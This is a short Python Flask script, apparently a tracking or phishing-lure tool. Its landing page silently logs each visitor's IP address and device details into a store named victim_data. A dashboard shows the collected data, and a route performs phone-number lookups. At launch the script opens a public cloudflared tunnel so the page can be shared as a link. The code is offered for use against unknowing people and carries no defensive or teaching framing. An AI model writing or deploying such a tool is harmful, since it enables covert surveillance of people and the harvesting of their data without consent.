```python
from flask import Flask, render_template, request
import os, threading
import subprocess
from utils import lookup_number, get_device_info

app = Flask(__name__)

victim_data = {}

@app.route('/')
def index():
    ip = request.remote_addr
    ua = request.headers.get('User-Agent')
    victim_data[ip] = get_device_info(ua)
    return render_template("index.html")

@app.route('/dashboard')
def dashboard():
    return render_template("dashboard.html", data=victim_data)

@app.route('/lookup', methods=['POST'])
def lookup():
    number = request.form.get('number')
    result = lookup_number(number)
    return result

def start_cloudflared():
    os.system("pkill cloudflared >/dev/null 2>&1")
    subprocess.Popen(['cloudflared', 'tunnel', '--url', 'http://localhost:5000'], stdout=subprocess.DEVNULL)

if __name__ == '__main__':
    threading.Thread(target=start_cloudflared).start()
    app.run(host='0.0.0.0', port=5000)
```
